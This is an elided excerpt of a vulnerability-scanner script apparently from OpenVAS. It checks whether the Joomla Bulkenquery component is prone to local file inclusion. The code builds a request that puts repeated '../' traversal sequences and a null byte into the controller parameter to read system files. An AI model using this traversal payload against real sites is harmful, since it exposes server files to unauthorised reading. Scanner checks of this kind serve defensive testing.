...
# $Id: gb_joomla_com_bulkenquery_lfi_vuln.nasl 11549 2018-09-22 12:11:10Z cfischer $
#
...
if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802573");
...
attacks and read arbitrary files on the affected application.");
  ...
  script_tag(name:"affected", value:"Joomla Bulkenquery Component");
...
a newer release, disable respective features, remove the product or replace the product by another one.");
  ...
  script_tag(name:"summary", value:"This host is running Joomla Bulkenquery component and is prone to local file
...
foreach file (keys(files)) {
  url = dir + "/index.php?option=com_bulkenquery&controller=" + crap(data:"../",length:3*15) + files[file] + "%00";
